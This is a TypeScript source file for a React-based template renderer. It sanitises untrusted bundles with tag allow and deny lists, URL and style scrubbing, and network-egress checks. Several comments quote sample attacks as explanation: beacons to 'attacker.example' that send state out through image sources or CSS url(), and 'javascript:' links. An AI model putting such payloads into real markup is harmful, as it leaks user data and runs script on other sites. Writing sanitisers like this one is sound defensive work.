/**
 * SoftN Renderer
 *
 * Converts SoftN AST to React elements.
 */

import React from 'react';
import type {
  SoftNDocument,
  TemplateNode,
  ElementNode,
  TextNode,
  ExpressionNode,
  IfBlock,
  EachBlock,
  Expression,
  SlotNode,
  TemplateSlotNode,
  BindingPattern,
  BindingTarget,
  ArrowFunctionExpression,
} from '../parser/ast';
import { EVENT_MODIFIERS, isIdentifierName, patternNames } from '../parser/ast';
import type { SoftNLocalScope, SoftNRenderContext, SoftNProps } from '../types';
import { ComponentRegistry, SoftNComponent } from './registry';
import {
  cssResourceReferences,
  isRemoteUrl,
  isSafeUrl,
  DOCUMENT_NAMED_TAGS,
  TOP_LAYER_ATTRIBUTES,
  URL_ATTRIBUTES,
} from './sanitize-html';
import { cssPropertyName, inlineStyleObject } from './inline-style';
import { isCallbackProp } from '../runtime/drawn-functions';
import {
  beginPass,
  keep,
  recall,
  sameNodes,
  sameProps,
  settleProps,
  type ReuseKind,
  type ReusePass,
} from './reuse';
import {
  describeMarkupEgress,
  describeSrcSetEgress,
  type EgressConfig,
} from '../runtime/egress-policy';
import { parseStatePath } from '../runtime/state-path';
import { markupValue } from './host-values';
import type { DocumentShellView } from '../document-shell/host';
import {
  followPageLinks,
  keepFieldEditable,
  keepFormOnPage,
  showBundleFiles,
  loadsFromOutside,
  textareaText,
  renameToReactAttributes,
  svgChildElement,
} from './html-elements';

/**
 * Write `value` at `path` in `state`, copying each record and list on the
 * way rather than changing it: what the path passes through may be the
 * page's own state, which only React writes.
 */
function writeStatePath(state: Record<string, unknown>, path: readonly string[], value: unknown): void {
  if (path.length === 0) return;
  let into: Record<string, unknown> | unknown[] = state;
  for (let i = 0; i < path.length - 1; i++) {
    const key = path[i];
    const next: unknown = (into as Record<string, unknown>)[key];
    const copy: Record<string, unknown> | unknown[] = Array.isArray(next)
      ? [...next]
      : next !== null && typeof next === 'object'
        ? { ...(next as Record<string, unknown>) }
        : {};
    (into as Record<string, unknown>)[key] = copy;
    into = copy;
  }
  (into as Record<string, unknown>)[path[path.length - 1]] = value;
}

// Maximum recursion depth for expression evaluation to prevent infinite loops
const MAX_EVAL_DEPTH = 100;

/**
 * What a template sees as `Object`.
 *
 * Not the real one: `Object.defineProperty` and its relatives are how a
 * template would rewrite the page it runs in. These three only read, and
 * `#each (key in Object.keys(totals))` is how a map is listed. `null` and
 * `undefined` answer an empty list, because data that has not loaded yet is
 * the usual reason a template meets them.
 *
 * They list what markup may hold (host-values.ts), going in and coming out:
 * `list.map(Object.entries)` is the browser calling these on whatever the
 * list holds, with no expression in between to check it.
 */
const TEMPLATE_OBJECT = Object.freeze({
  keys: (value: unknown) => Object.keys(Object(markupValue(value) ?? {})),
  values: (value: unknown) => Object.values(Object(markupValue(value) ?? {})).map(markupValue),
  entries: (value: unknown) =>
    Object.entries(Object(markupValue(value) ?? {})).map(([key, held]): [string, unknown] => [key, markupValue(held)]),
});

/**
 * JavaScript globals available in template expressions.
 * These are commonly used in .ui files (e.g., Number(), String(), Math.round()).
 */
const JS_GLOBALS: Record<string, unknown> = {
  Number,
  String,
  Boolean,
  Array,
  Date,
  Map,
  Set,
  Math,
  JSON,
  Object: TEMPLATE_OBJECT,
  parseInt,
  parseFloat,
  isNaN,
  isFinite,
  NaN,
  Infinity,
  undefined,
  encodeURIComponent,
  decodeURIComponent,
};

/**
 * What `new` may construct in a template.
 *
 * An expression here runs in the host page, not in the script VM, so `new`
 * on whatever a name evaluates to would be a way to run a constructor the
 * author was never handed. These build values and nothing else.
 */
const CONSTRUCTIBLE: ReadonlySet<unknown> = new Set([Date, Array, Map, Set]);

const BLOCKED_MEMBER_KEYS = new Set(['constructor', '__proto__', 'prototype']);

/**
 * How many `renderNode` calls are on the stack. Above zero the page is being
 * drawn, and an expression evaluated now is one the page shows, not one a
 * person triggered: see `stateWriteAllowed`.
 */
let renderDepth = 0;

/** Expressions already reported for writing state while the page was drawn. */
const reportedRenderWrites = new WeakSet<object>();

/**
 * Whether an assignment or `++` may write state right now.
 *
 * A handler runs when something happens; `{count++}` in the body of a page
 * runs every time the page is drawn, and the write it makes causes the next
 * drawing. With `++` readable that is a loop from one keystroke: React stops
 * it by tearing the document down ("Too many re-renders"). So while the page
 * is being drawn the expression is worth what it would be worth and writes
 * nothing, and says so once. An arrow called during the drawing, such as the
 * callback of `items.map(…)`, is the same case; an arrow called by an event
 * is not, because by then nothing is being drawn.
 */
function stateWriteAllowed(expr: Expression, what: string): boolean {
  if (renderDepth === 0) return true;
  if (!reportedRenderWrites.has(expr)) {
    reportedRenderWrites.add(expr);
    console.error(
      `[SoftN] ${what} on line ${expr.loc?.line ?? '?'} changes state while the page is being drawn, ` +
        'which would draw it again without end, so the change was not made. ' +
        'Change state in a handler: @click={() => count++}.'
    );
  }
  return false;
}

function getSafeMemberKey(value: unknown): string | null {
  const key = String(value);
  return BLOCKED_MEMBER_KEYS.has(key) ? null : key;
}

/**
 * Per-component error boundary for isolating rendering failures.
 * When a registered SoftN component throws during render, this boundary
 * catches the error and shows an inline indicator instead of crashing the
 * entire document tree.
 */
class ComponentErrorBoundary extends React.Component<
  React.PropsWithChildren<{ tag: string; failure?: { caught: boolean } }>,
  { error: Error | null }
> {
  state: { error: Error | null } = { error: null };

  static getDerivedStateFromError(error: Error): { error: Error } {
    return { error };
  }

  componentDidCatch(error: Error, info: React.ErrorInfo) {
    // Tell whoever kept this element that it holds a failure, so the next
    // drawing makes the component again rather than handing this back. A
    // component that failed has always been tried again when the page next
    // drew, which is how one recovers once whatever it lacked has arrived.
    if (this.props.failure) this.props.failure.caught = true;
    if (isDevelopment) {
      console.error(`[SoftN] Error in <${this.props.tag}>:`, error);
      console.error('[SoftN] Component stack:', info.componentStack);
    }
  }

  componentDidUpdate(prevProps: React.PropsWithChildren<{ tag: string }>) {
    // Auto-reset error state when children change (e.g., source code updated)
    if (this.state.error && prevProps.children !== this.props.children) {
      this.setState({ error: null });
    }
  }

  render() {
    if (this.state.error) {
      return React.createElement(
        'div',
        {
          style: {
            padding: '0.5rem 0.75rem',
            margin: '0.25rem 0',
            background: 'var(--softn-error-bg, #fef2f2)',
            border: '1px solid var(--softn-error-border, #fecaca)',
            borderRadius: '6px',
            color: 'var(--softn-error-text, #b91c1c)',
            fontSize: '0.75rem',
            fontFamily: 'ui-monospace, monospace',
            lineHeight: 1.5,
          },
        },
        React.createElement('strong', null, `<${this.props.tag}>`),
        ` ${this.state.error.message}`
      );
    }
    return this.props.children;
  }
}

/** A handler a template wires to an event. What it is given depends on the
 * component, so its arguments and result are whatever they turn out to be. */
type EventHandler = (...args: unknown[]) => unknown;

/**
 * For a change or input event, what changed rather than the event: VM
 * functions receive the field's value, not a React SyntheticEvent, which does
 * not survive the trip into a script. Anything that is not such an event --
 * a component that calls `@change` with its own data -- passes through.
 */
function changedValue(event: unknown): unknown {
  const target = eventTarget(event);
  return target && 'value' in target ? target.value : event;
}

/**
 * What `:bind` writes for a change: the field's value, and for a number
 * field the number it holds. A field's `value` is always text, so `<input
 * type="number" :bind={qty} />` made `qty` the string "5" and `qty + 1` in
 * the logic "51". A number field that holds a finite number writes it as a
 * number; one that is empty, or holds what is not a number, writes `''`, so a
 * page's `qty === ''` still means nothing was entered. Decided by the field
 * the event came from, so a component that hands on its input's event, as
 * `<Input type="number">` does, binds the same way.
 */
function boundValue(event: unknown): unknown {
  const target = eventTarget(event);
  if (!target || !('value' in target)) return event;
  const value = target.value;
  if (target.type !== 'number' || typeof value !== 'string') return value;
  if (value.trim() === '') return '';
  const number = Number(value);
  return Number.isFinite(number) ? number : '';
}

/** The `target` of something shaped like a DOM event, or `undefined` when it
 * is not one -- a custom component hands its handler plain data instead. */
function eventTarget(event: unknown): Record<string, unknown> | undefined {
  if (!event || typeof event !== 'object' || !('target' in event)) return undefined;
  const target = (event as { target: unknown }).target;
  return target && typeof target === 'object' ? (target as Record<string, unknown>) : undefined;
}

// Check if we're in development mode - works in both browser and Node.js
const isDevelopment = (() => {
  try {
    // `import.meta.env` is Vite's, not the language's. A cast rather than a
    // `@ts-expect-error` because whether the property is declared depends on
    // who is compiling: core's own tsconfig has never heard of it, while a root
    // typecheck that also covers an app referencing `vite/client` has — and a
    // suppression that is unnecessary in one of those is itself an error.
    const meta = import.meta as unknown as { env?: { DEV?: boolean } } | undefined;
    if (meta?.env?.DEV) {
      return true;
    }
    if (typeof process !== 'undefined' && process.env?.NODE_ENV === 'development') {
      return true;
    }
  } catch {
    // Ignore errors
  }
  return false;
})();

/**
 * Render a SoftN document to React elements
 */
export function renderDocument(
  document: SoftNDocument,
  context: SoftNRenderContext,
  registry: ComponentRegistry
): React.ReactNode {
  // A page whose code is given the document: its body is what the code has
  // made of it (see document-shell/host.ts).
  if (context.documentShell) {
    return React.createElement(ShellBody, { shell: context.documentShell, template: document.template, context, registry });
  }
  // A host that keeps a cache for this mount gets back, for everything that
  // comes out the same as last time, the element it was given last time; see
  // reuse.ts. Without one every element is made afresh.
  if (!context.renderCache) return renderNodes(document.template, context, registry);
  const outer = pass;
  pass = beginPass(context.renderCache, document);
  try {
    return renderNodes(document.template, context, registry);
  } finally {
    pass = outer;
  }
}

/**
 * The drawing in progress, when the host keeps what is drawn between one
 * render and the next. Module state, like `renderDepth`: a drawing is one
 * synchronous call, and the functions below are too many to hand it through.
 */
let pass: ReusePass | null = null;

/**
 * A fragment holding `children`, or the one this place had last time when
 * the children are the elements they were.
 */
function reusableFragment(
  node: object,
  kind: ReuseKind,
  cacheKey: number | string | undefined,
  reactKey: number | string | undefined,
  children: React.ReactNode
): React.ReactNode {
  const active = pass;
  if (!active || typeof cacheKey !== 'string' || !Array.isArray(children)) {
    return React.createElement(React.Fragment, { key: reactKey }, children);
  }
  const before = recall(active, cacheKey, node, kind);
  if (before && before.text === String(reactKey) && sameNodes(before.children, children)) {
    keep(active, cacheKey, before);
    return before.result;
  }
  const result = React.createElement(React.Fragment, { key: reactKey }, children);
  keep(active, cacheKey, { node, kind, result, children, text: String(reactKey) });
  return result;
}

/**
 * Generate a stable key for a template node based on its location
 */
function generateNodeKey(node: TemplateNode, index: number, parentKey?: string): string {
  const prefix = parentKey ? `${parentKey}-` : '';

  // Use source location if available for stable keys
  if (node.loc) {
    return `${prefix}${node.type}-L${node.loc.line}-C${node.loc.column}`;
  }

  // Fallback to index-based key (less stable but better than nothing)
  return `${prefix}${node.type}-${index}`;
}

/**
 * Render an array of template nodes
 */
export function renderNodes(
  nodes: TemplateNode[],
  context: SoftNRenderContext,
  registry: ComponentRegistry,
  parentKey?: string
): React.ReactNode {
  return nodes.map((node, index) => {
    const key = generateNodeKey(node, index, parentKey);
    return renderNode(node, context, registry, key);
  });
}

/**
 * Render a single template node
 */
export function renderNode(
  node: TemplateNode,
  context: SoftNRenderContext,
  registry: ComponentRegistry,
  key?: number | string
): React.ReactNode {
  renderDepth++;
  try {
    return renderNodeOfKind(node, context, registry, key);
  } finally {
    renderDepth--;
  }
}

function renderNodeOfKind(
  node: TemplateNode,
  context: SoftNRenderContext,
  registry: ComponentRegistry,
  key?: number | string
): React.ReactNode {
  switch (node.type) {
    case 'Element': {
      const shell = context.documentShell;
      const id = shell?.idOf(node);
      if (shell && id !== undefined) {
        return React.createElement(ShellElement, { key, shell, id, context, registry });
      }
      return renderElement(node, context, registry, key);
    }

    case 'Text':
      return renderText(node, key);

    case 'Expression':
      return renderExpression(node, context, key);

    case 'IfBlock':
      return renderIfBlock(node, context, registry, key);

    case 'EachBlock':
      return renderEachBlock(node, context, registry, key);

    case 'Slot':
      return renderSlot(node, context, registry, key);

    case 'TemplateSlot':
      // Template slots are collected by parent elements and passed via context
      // They should not be rendered directly - return null here
      return null;

    default:
      return null;
  }
}

/**
 * Safe-by-default HTML allowlist for untrusted bundles.
 * Excludes all active content tags (script, iframe, embed, object, etc.)
 * and document metadata tags that could bypass security policies.
 */
const HTML_ELEMENTS = new Set([
  // Content sectioning
  'address',
  'article',
  'aside',
  'footer',
  'header',
  'h1',
  'h2',
  'h3',
  'h4',
  'h5',
  'h6',
  'hgroup',
  'main',
  'nav',
  'section',
  'search',
  // Text content
  'blockquote',
  'dd',
  'div',
  'dl',
  'dt',
  'figcaption',
  'figure',
  'hr',
  'li',
  'menu',
  'ol',
  'p',
  'pre',
  'ul',
  // Inline text semantics
  'a',
  'abbr',
  'b',
  'bdi',
  'bdo',
  'br',
  'cite',
  'code',
  'data',
  'dfn',
  'em',
  'i',
  'kbd',
  'mark',
  'q',
  'rp',
  'rt',
  'ruby',
  's',
  'samp',
  'small',
  'span',
  'strong',
  'sub',
  'sup',
  'time',
  'u',
  'var',
  'wbr',
  // Image and multimedia
  'area',
  'audio',
  'img',
  'map',
  'track',
  'video',
  // Safe embedded content (no active content loaders)
  'picture',
  'source',
  // SVG and MathML
  'svg',
  'math',
  // Canvas (drawing API, no script execution)
  'canvas',
  // Demarcating edits
  'del',
  'ins',
  // Table content
  'caption',
  'col',
  'colgroup',
  'table',
  'tbody',
  'td',
  'tfoot',
  'th',
  'thead',
  'tr',
  // Forms
  'button',
  'datalist',
  'fieldset',
  'form',
  'input',
  'label',
  'legend',
  'meter',
  'optgroup',
  'option',
  'output',
  'progress',
  'select',
  'textarea',
  // Interactive elements
  'details',
  'dialog',
  'summary',
]);

/**
 * Explicitly blocked tags — active content, document metadata, and embedded
 * contexts that could execute code or load external resources in the host DOM.
 * Checked as a denylist safeguard even if the allowlist evolves.
 */
const BLOCKED_TAGS = new Set([
  'script',    // JS execution
  'iframe',    // embedded browsing context
  'embed',     // plugin content
  'object',    // plugin/embedded content
  'portal',    // embedded browsing context
  'link',      // external resource loading
  'meta',      // http-equiv redirects, CSP overrides
  'base',      // base URL hijacking
  'style',     // CSS injection (handled separately by sanitizer)
  'template',  // inert but can be activated by scripts
  'noscript',  // content injection when scripts disabled
  'html',      // document root
  'head',      // document metadata container
  'body',      // document body
  'title',     // document title
  'param',     // object parameters
  'slot',      // web component slot
]);

/**
 * Whether the document a page's code is given holds this tag as plain HTML
 * it may change: an element the renderer draws as itself, written in lower
 * case, and not an `<svg>`, whose inside is a drawing of its own.
 */
export function shellOwnsTag(tag: string): boolean {
  return tag === tag.toLowerCase() && tag !== 'svg' && isHTMLElement(tag);
}

interface ShellProps {
  shell: DocumentShellView;
  context: SoftNRenderContext;
  registry: ComponentRegistry;
}

/**
 * An element of the document the page's code is given: drawn as its markup
 * says, with what the code has done to it over that, or as the markup for
 * an element the code made would be, through the renderer's one path for
 * elements and its checks. Drawn again when the code changes it, and no
 * more than it.
 */
function ShellElement({ shell, id, context, registry }: ShellProps & { id: number }): React.ReactElement {
  const subscribe = React.useCallback((onChange: () => void) => shell.subscribe(id, onChange), [shell, id]);
  const read = () => shell.version(id);
  const version = React.useSyncExternalStore(subscribe, read, read);
  // A value, a tick or focus the code asked for is the drawn element's own
  // state, not markup: done to it once it is on the page.
  React.useLayoutEffect(() => shell.settle(id), [shell, id, version]);
  return React.createElement(React.Fragment, null, renderElement(shell.elementFor(id), context, registry));
}

/** The page's body, as the code has made it. */
function ShellBody({ shell, template, context, registry }: ShellProps & { template: TemplateNode[] }): React.ReactElement {
  const subscribe = React.useCallback((onChange: () => void) => shell.subscribe(shell.bodyId, onChange), [shell]);
  const read = () => shell.version(shell.bodyId);
  React.useSyncExternalStore(subscribe, read, read);
  return React.createElement(React.Fragment, null, renderNodes(shell.bodyFor(template), context, registry));
}

/**
 * Take off a plain tag what would run as code in the page itself. A handler
 * is a function SoftN made (`onClick` from `@click` or `onclick="…"`); one
 * given as text (`ONCLICK="…"`, or `onclick` from the code a page runs) is
 * React's to write as an attribute wherever it treats the element as custom,
 * and `is="…"` makes any element custom, so the browser would run it. Both
 * go: `is`, and every `on…` that is not a function.
 */
function dropCodeAttributes(props: SoftNProps): void {
  for (const name of Object.keys(props)) {
    const lower = name.toLowerCase();
    if (lower === 'is' || (lower.startsWith('on') && typeof props[name] !== 'function')) delete props[name];
  }
}

/**
 * Check if a tag is a valid HTML element (safe for untrusted rendering)
 */
function isHTMLElement(tag: string): boolean {
  const lower = tag.toLowerCase();
  if (BLOCKED_TAGS.has(lower)) return false;
  return HTML_ELEMENTS.has(lower);
}

/**
 * HTML elements that cannot contain children. React rejects the children
 * argument for these outright rather than ignoring it.
 */
const VOID_ELEMENTS = new Set([
  'area',
  'base',
  'br',
  'col',
  'embed',
  'hr',
  'img',
  'input',
  'link',
  'meta',
  'param',
  'source',
  'track',
  'wbr',
]);

/**
 * Attributes whose value the browser will fetch or navigate to.
 *
 * `BLOCKED_TAGS` above stops a bundle from writing `<script>`, but nothing
 * stopped it writing `<a href="javascript:…">`: React only warns, and one click
 * then runs bundle-authored code on the host origin, where every other app's
 * `softn:*` and `xdb:*` storage is readable. `<img src="https://…?d={state}">`
 * is the same hole without the click, and without needing the `net` grant.
 */
const URL_PROPS = new Set([
  ...URL_ATTRIBUTES,
  // React's camelCase spelling of xlink:href, as it reads once lowercased.
  'xlinkhref',
]);

/**
 * The name a URL prop is judged by: lowercased, because that is how the
 * browser reads it. `URL_ATTRIBUTES` is the HTML list and carries only
 * lowercase names, while React spells the same attributes `formAction`,
 * `srcSet` and `xlinkHref` — and passes any other casing an author writes
 * straight to `setAttribute`, which lowercases it on an HTML element. An
 * exact-case lookup let `<button formAction="javascript:…">` reach the DOM
 * with no check in front of it, and `srcSet` had to be listed by hand.
 */
function urlPropName(name: string): string {
  return name.toLowerCase();
}

/**
 * What the render may let the browser fetch: the bundle's permission config
 * when the host supplied one, the one-bit "withheld while pending" policy
 * when it supplied only consent state, and nothing at all — every URL passes
 * — when it is not enforcing.
 */
type EgressPolicy = EgressConfig | null;

function egressPolicyFor(context: SoftNRenderContext): EgressPolicy {
  if (context.egress) return context.egress;
  return context.consentPending === true ? { consentPending: true } : null;
}

/**
 * Whether a URL prop is egress the app is not allowed.
 *
 * The consent bar withholds every softn.* capability until the user answers,
 * but the bundle's own markup never went through softn.*: `<Image src="https://
 * attacker.example/beacon?d=…">` renders a raw `<img src>`, and the browser
 * fetches it on first paint. Under the modal that was unreachable by accident,
 * because the app did not exist until Allow. And after Allow it used to go
 * anywhere: a bundle that declared no `net` at all, or scoped itself to one
 * host, could still beacon state to any host from an image source. Now the
 * same rule `softn.net.fetch` applies decides here — `net` must be granted
 * and the destination permitted — through the evaluator in egress-policy.ts.
 * A relative, `data:` or `blob:` source is not egress and is untouched, so a
 * bundle's own images keep working with no capability at all.
 *
 * `href` is the one exception once consent is answered: a link is navigation
 * the user chooses and can see, not a fetch the render performs, and a bundle
 * that links to its author's site has not used the network. `srcset` gets
 * its own reading because it is a list, not a URL.
 */
function isWithheldUrl(name: string, value: string, policy: EgressPolicy): boolean {
  if (policy === null) return false;
  const canonical = urlPropName(name);
  if (canonical === 'href') return policy.consentPending === true && isRemoteUrl(value);
  const verdict =
    canonical === 'srcset'
      ? describeSrcSetEgress(value, policy)
      : describeMarkupEgress(value, policy);
  return !verdict.allowed;
}

/**
 * Drop the `name` of an element the document answers to by name, which would
 * stand in for one of `document`'s own members; see
 * {@link DOCUMENT_NAMED_TAGS}. Any casing, because the browser lowercases an
 * attribute's name on an HTML element whatever React was given.
 */
function dropDocumentName(props: SoftNProps, tag: string): void {
  if (!DOCUMENT_NAMED_TAGS.has(tag.toLowerCase())) return;
  for (const name of Object.keys(props)) {
    if (name.toLowerCase() === 'name') delete props[name];
  }
}

/**
 * Drop unsafe URL props before they reach a raw HTML element.
 *
 * Every name in `URL_PROPS` is safe to judge by name here, because on a raw
 * element it can only ever mean the URL the browser will fetch.
 */
function sanitizeUrlProps(props: SoftNProps, tag: string, policy: EgressPolicy): void {
  for (const name of Object.keys(props)) {
    if (!URL_PROPS.has(urlPropName(name))) continue;
    const value = props[name];
    if (value === undefined || value === null) continue;
    const safe = judgedUrl(name, value, policy);
    if (safe === undefined) {
      // `href={on && url}` is false when there is nothing to link to: no
      // attribute, and nothing worth a warning.
      if (isDevelopment && typeof value !== 'boolean') {
        console.warn(`[SoftN] Blocked unsafe URL in <${tag} ${name}>: ${describeUrlValue(value)}`);
      }
      delete props[name];
    } else if (safe !== value) {
      props[name] = safe;
    }
  }
}

/**
 * What an SVG element would load, judged as a fetch.
 *
 * On `<use>` or a gradient, `href` is not a link a person follows but what
 * the element draws or inherits from, so it is judged as `src` is, unless it
 * names something in the page (`#icon`), which is how a sprite is used. And
 * a value that loads through `url(…)` from outside the page, such as
 * `fill="url(https://…#paint)"`, is dropped: see `loadsFromOutside`.
 */
function sanitizeSvgReferences(props: SoftNProps, tag: string, policy: EgressPolicy): void {
  for (const name of Object.keys(props)) {
    const value = props[name];
    const lower = name.toLowerCase();
    let refused: boolean;
    if (lower === 'href' || lower === 'xlinkhref' || lower === 'xlink:href') {
      const text = urlText(value);
      refused =
        text !== undefined &&
        !text.trim().startsWith('#') &&
        (!isSafeUrl(text) || isWithheldUrl('src', text, policy));
    } else {
      refused = name !== 'style' && loadsFromOutside(value);
    }
    if (refused) {
      if (isDevelopment) {
        console.warn(`[SoftN] Blocked a load from outside the app in <${tag} ${name}>: ${describeUrlValue(value)}`);
      }
      delete props[name];
    }
  }
}

/**
 * A URL prop's value as the text the browser will be given, or `undefined`
 * when it is not one.
 *
 * The check used to begin `typeof value === 'string'` and pass everything
 * else on as it was, and React writes a list into an attribute as its
 * entries joined: `href={["javascript:alert(1)"]}` reached the page as
 * `href="javascript:alert(1)"`, and `src={["https://attacker.example/b"]}`
 * was fetched while consent was pending. Only text is judged because only
 * text can be: a list's entries can each be allowed and still join into a
 * URL at another host (`["https://cdn.example", "@attacker.example/x"]` is
 * user `cdn.example,` at host `attacker.example`), and an object says
 * whatever its `toString` says on the day. A finite number is its digits.
 */
function urlText(value: unknown): string | undefined {
  if (typeof value === 'string') return value;
  if (typeof value === 'number' && Number.isFinite(value)) return String(value);
  return undefined;
}

/**
 * The text to hand on for a URL prop, or `undefined` when it must not be.
 * What comes back is the string that was judged, never the value it was
 * read from.
 */
function judgedUrl(name: string, value: unknown, policy: EgressPolicy): string | undefined {
  const text = urlText(value);
  if (text === undefined) return undefined;
  return isSafeUrl(text) && !isWithheldUrl(name, text, policy) ? text : undefined;
}

/** A refused URL value for the development warning: its text, or what kind of thing it was. */
function describeUrlValue(value: unknown): string {
  if (typeof value === 'string') return value.slice(0, 80);
  return Array.isArray(value) ? 'a list, where a URL is text' : `${typeof value}, where a URL is text`;
}

/**
 * Drop `dangerouslySetInnerHTML`: markup a bundle writes itself, set as the
 * element's HTML with no tag list, no attribute list and no URL check in
 * front of it.
 *
 * Nothing here removed it. What stopped `<div dangerouslySetInnerHTML={x} />`
 * from being the whole of the sanitiser's undoing was React, which refuses
 * the prop on an element that is also given children, and this renderer
 * happens to hand every element a children list, empty or not. That is an
 * accident of how elements are built two screens below, and the refusal was
 * an exception that took the document down with it. It is removed by name
 * now, on a raw element and on a registered component alike: a component
 * that spreads the props it does not know onto its root would set it just
 * as a `<div>` does. React knows the prop by this spelling and no other.
 */
function dropRawMarkupProp(props: SoftNProps): void {
  if ('dangerouslySetInnerHTML' in props) delete props.dangerouslySetInnerHTML;
}

/**
 * Drop the attributes that open an element in the top layer, which no
 * containment clips; see {@link TOP_LAYER_ATTRIBUTES}. On a raw element only:
 * a registered component's props are named by its author and none of the
 * built-ins passes unknown props to the DOM.
 */
function dropTopLayerProps(props: SoftNProps): void {
  for (const name of Object.keys(props)) {
    if (TOP_LAYER_ATTRIBUTES.has(name.toLowerCase())) delete props[name];
  }
}

/**
 * Withhold remote `url(...)` from an inline `style={{…}}`.
 *
 * `sanitizeBundleCSS` already rewrites remote `url()` in a bundle's style
 * block; the inline style object is a second route to the identical fetch —
 * `style={{ backgroundImage: "url(https://attacker.example/beacon)" }}` — and
 * it had no check at all. What it may load after the user allows is the same
 * question every other sink asks, with the same answer: `net`, granted, to a
 * permitted host. A bundle that legitimately points at a CDN declares it.
 *
 * The check used to look for the text `url(`, which is one of the ways to
 * spell a fetch and not the others: `URL(`, `\75rl(`, a name split by an
 * empty comment and `image-set("https://…" 1x)` all reached the page, and each made the
 * request. The scan now undoes comments and escapes and knows every CSS
 * function that loads something, and a declaration that carries a resource
 * the app may not load is dropped whole — a value that needed escapes to say
 * what it says is dropped too, because nothing an inline style legitimately
 * says needs them, and the alternative is trusting a parser to have thought
 * of every spelling.
 *
 * The object is copied rather than mutated: it may be the app's own state, and
 * deleting from that would corrupt the state as well as the render.
 */
function withholdRemoteStyleUrls(props: SoftNProps, policy: EgressPolicy): void {
  if (policy === null) return;
  const style = props.style;
  if (typeof style !== 'object' || style === null || Array.isArray(style)) return;

  let copy: Record<string, unknown> | null = null;
  for (const [name, value] of Object.entries(style as Record<string, unknown>)) {
    if (typeof value !== 'string') {
      // A number is a length or a weight, and nothing at all is nothing set.
      // A list or an object is neither, and React writes it out as text:
      // `backgroundImage: ["url(https://attacker.example/b)"]` was the same
      // fetch as the string this function was written to stop.
      if (value === null || value === undefined || typeof value === 'number' || typeof value === 'boolean') continue;
      if (!copy) copy = { ...(style as Record<string, unknown>) };
      delete copy[name];
      continue;
    }
    const scan = cssResourceReferences(value);
    if (!scan.opaque && scan.urls.length === 0) continue;
    const withheld =
      scan.opaque || scan.urls.some((target) => !describeMarkupEgress(target, policy).allowed);
    if (!withheld) continue;
    if (!copy) copy = { ...(style as Record<string, unknown>) };
    delete copy[name];
  }
  if (copy) props.style = copy;
}

/**
 * URL prop names scrubbed on registered components too, not just raw elements.
 *
 * A registered component is not the boundary the check above assumed it was:
 * `<Breadcrumb items={[{label, href}]}>` hands the href straight to an `<a>`,
 * so leaving the guarantee to each of the built-ins holds only for as long
 * as every one of them remembers. Scrubbing here makes it structural.
 *
 * The set is deliberately narrower than `URL_ATTRIBUTES`, because a component
 * prop is named by whoever wrote the component rather than by HTML. `data` is
 * the rows a chart plots, `action` is the ReactNode an `<EmptyState>` renders
 * under its message, and `background` and `cite` read as a colour and a
 * quotation source — dropping those by name would delete legitimate values.
 * What is left means a URL and nothing else.
 */
const COMPONENT_URL_PROPS = new Set([
  'href',
  'src',
  'srcset',
  'poster',
  'formaction',
  'xlinkhref',
  'xlink:href',
  // <Image fallbackSrc> is loaded the moment the primary source fails, and
  // was the one image URL a component took under a name this list did not
  // know: a remote fallback beaconed while consent was pending, and with no
  // `net` grant at all after it. Judged here it is withheld like `src`.
  'fallbacksrc',
  // <NavItem navigate> is the address its link goes to.
  'navigate',
]);

/**
 * How far inside a prop value the scrub descends before it stops handing
 * the value on.
 *
 * `items={[{href}]}` is already two levels down and every level of a tree is
 * two more. The cap used to be 8, and what lay past it was returned as it
 * was: a URL five levels down a tree was not judged at all. A value that
 * refers back to itself is what the cap was for, and that is now caught as
 * what it is (see `Scrubbed`), so the cap only bounds the call stack. It
 * is far past any tree an app draws, and what is past it is dropped, not
 * passed: a limit on what gets checked must not be a way round the check.
 */
const MAX_SCRUB_DEPTH = 512;

function isPlainObject(value: unknown): value is Record<string, unknown> {
  if (typeof value !== 'object' || value === null) return false;
  const proto = Object.getPrototypeOf(value);
  return proto === Object.prototype || proto === null;
}

/**
 * Return `value` with any unsafe URL under a `COMPONENT_URL_PROPS` key removed.
 *
 * The same reference comes back when nothing was unsafe, and a copy otherwise:
 * these arrays and objects are the app's own state, so deleting a key in place
 * would corrupt the state as well as the render.
 */
/**
 * What one scrub has made of each list and record it has met.
 *
 * A value is `WALKING` while the scrub is inside it and its scrubbed form
 * once it is through. That is two questions answered at once. Meeting a
 * value that is still being walked is a value that holds itself, and the way
 * back round is cut. Meeting one that is done is a value reached by a second
 * path, and it is not walked again: without this a tree whose branches are
 * shared (`node.children = [below, below]`, twenty levels of it) was walked
 * once per path, a million times, where the depth limit this replaced had
 * at least kept that short.
 */
type Scrubbed = Map<object, unknown>;
const WALKING = Symbol('being scrubbed');

function scrubUrlsIn(
  value: unknown,
  depth: number,
  blocked: string[],
  policy: EgressPolicy,
  seen: Scrubbed
): unknown {
  // Elements arriving as a prop were built by `renderElement`, which already
  // sanitized them; copying one here would drop the non-enumerable bookkeeping
  // React puts on it.
  if (React.isValidElement(value)) return value;

  const list = Array.isArray(value);
  if (!list && !isPlainObject(value)) return value;
  const holder = value as object;

  if (seen.has(holder)) {
    // A value that holds itself: the way back up ends here, where returning
    // the original would hand over everything in it unjudged. One that has
    // been walked already (a record that appears twice) is what it was
    // found to be the first time.
    const before = seen.get(holder);
    return before === WALKING ? undefined : before;
  }
  if (depth > MAX_SCRUB_DEPTH) return undefined;

  seen.set(holder, WALKING);
  let result: unknown;
  if (list) {
    const entries = value as unknown[];
    let copy: unknown[] | null = null;
    for (let i = 0; i < entries.length; i++) {
      const next = scrubUrlsIn(entries[i], depth + 1, blocked, policy, seen);
      if (next !== entries[i]) {
        if (!copy) copy = entries.slice();
        copy[i] = next;
      }
    }
    result = copy ?? value;
  } else {
    const record = value as Record<string, unknown>;
    let copy: Record<string, unknown> | null = null;
    for (const name of Object.keys(record)) {
      const next = scrubUrlProp(name, record[name], depth + 1, blocked, policy, seen);
      if (next !== record[name]) {
        if (!copy) copy = { ...record };
        copy[name] = next;
      }
    }
    result = copy ?? value;
  }
  seen.set(holder, result);
  return result;
}

function scrubUrlProp(
  name: string,
  value: unknown,
  depth: number,
  blocked: string[],
  policy: EgressPolicy,
  seen: Scrubbed
): unknown {
  if (COMPONENT_URL_PROPS.has(urlPropName(name))) {
    if (value === undefined || value === null) return value;
    // Text or nothing, at any depth: see `urlText`. A component that puts
    // `item.href` into an <a> writes a list out exactly as a raw <a> does.
    const safe = judgedUrl(name, value, policy);
    if (safe === undefined && typeof value !== 'boolean') blocked.push(describeUrlValue(value));
    return safe;
  }
  return scrubUrlsIn(value, depth, blocked, policy, seen);
}

